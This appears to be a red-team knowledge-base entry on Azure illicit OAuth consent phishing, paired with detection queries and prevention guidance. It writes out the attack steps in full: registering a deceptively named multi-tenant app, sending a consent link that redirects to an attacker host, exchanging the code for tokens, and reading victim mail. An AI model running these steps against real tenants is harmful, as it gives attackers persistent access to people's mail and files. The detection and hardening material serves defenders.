name: Azure Illicit Consent Grant - OAuth App Phishing
description: Register a multi-tenant Entra application and trick a victim into granting it delegated Microsoft Graph permissions (Mail.Read, Files.Read.All, offline_access, etc.) via the real OAuth consent screen. Once consented, the attacker's app holds a refresh token and persistent delegated access to the victim's mailbox/files - independent of the victim's password and surviving password resets.
notes:
=== THE IDEA ===
  You don't steal a password. You get the victim to consent to YOUR app,
  which then has a refresh token for the scopes they approved. Access
  persists until an admin revokes the grant / disables the app.

=== STEP 1: REGISTER A MULTI-TENANT APP ===
  az ad app create --display-name "HR Portal" \
    --sign-in-audience AzureADMultipleOrgs \
    --web-redirect-uris https://<attacker_host>/callback
  # add delegated Graph permissions: Mail.Read, Files.Read.All, offline_access
  az ad app permission add --id <app_id> \
    --api 00000003-0000-0000-c000-000000000000 \
    --api-permissions <permission_guid>=Scope

=== STEP 2: SEND THE CONSENT LINK (lure) ===
  https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
    client_id=<client_id>&response_type=code
    &redirect_uri=https://<attacker_host>/callback
    &scope=offline_access%20Mail.Read%20Files.Read.All
    &state=1
  # victim clicks, sees the real Microsoft consent page, clicks Accept

=== STEP 3: EXCHANGE CODE FOR TOKENS (attacker callback) ===
  curl -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \
    -d 'client_id=<client_id>' -d 'client_secret=<secret>' \
    -d 'grant_type=authorization_code' -d 'code=<code>' \
    -d 'redirect_uri=https://<attacker_host>/callback'
  # returns access_token + refresh_token for the consented scopes

=== STEP 4: USE DELEGATED GRAPH ACCESS ===
  curl -H "Authorization: Bearer <access_token>" \
    https://graph.microsoft.com/v1.0/me/messages

=== TOOLING ===
  o365-attack-toolkit, GraphRunner (Invoke-InjectOAuthApp), 365-Stealer.

examples.label: Register a multi-tenant app
examples.command: az ad app create --display-name 'HR Portal' --sign-in-audience AzureADMultipleOrgs --web-redirect-uris https://<url>/callback

examples.label: Read victim mail with the token

recommended.note: GraphRunner injects malicious OAuth apps and uses the tokens.

defense.why_it_works: User consent to third-party OAuth apps is a supported feature. If the tenant allows users to consent to apps (or consent is phished from an admin), a victim can grant a rogue multi-tenant app delegated Graph scopes, giving the attacker a refresh token and standing access independent of the password.
defense.prerequisites: A registered multi-tenant Entra app with a secret and a redirect URI, requested delegated scopes, and a victim who clicks Accept on the consent screen (or an admin who grants tenant-wide consent).
defense.impact: Persistent delegated access to the victim's mail, files, and other Graph data; the refresh token survives password resets, so remediation requires revoking the grant and the app - true persistence.
defense.detection: [MITRE T1098.003] Entra audit log 'Consent to application' / 'Add OAuth2PermissionGrant' / 'Add app role assignment' events, especially for unfamiliar multi-tenant apps requesting sensitive scopes (Mail.Read, Files.Read.All, offline_access).
defense.artifacts: Entra AuditLogs operations 'Consent to application' and 'Add delegated permission grant'; ServicePrincipal and OAuth2PermissionGrant objects for the rogue app; Graph API access from the app's service principal.
defense.splunk_spl:
index=azure sourcetype=azure:aad:audit (operationName="Consent to application" OR operationName="Add OAuth2PermissionGrant" OR operationName="Add delegated permission grant to*")
| stats count by initiatedBy.user.userPrincipalName, targetResources{}.displayName
defense.sentinel_kql:
AuditLogs
| where OperationName in ("Consent to application","Add OAuth2PermissionGrant","Add delegated permission grant to service principal")
| project TimeGenerated, InitiatedBy, OperationName, TargetResources
defense.prevention: Disable user consent to apps and require admin consent (with an admin-consent request workflow); restrict consent to verified publishers and low-risk scopes; enable Entra app consent policies; review enterprise-app consent grants regularly; alert on new OAuth grants for sensitive scopes.

detections.name: Illicit OAuth consent grant for sensitive scopes
detections.logic:
AuditLogs
| where OperationName in ("Consent to application","Add OAuth2PermissionGrant","Add delegated permission grant to service principal")
| mv-expand TargetResources
| extend App=tostring(TargetResources.displayName)
| project TimeGenerated, InitiatedBy, OperationName, App
detections.false_positives: Legitimate onboarding of new SaaS/line-of-business apps
detections.tuning: Allowlist approved publishers/apps; alert on consent to multi-tenant apps requesting Mail/Files/offline_access scopes
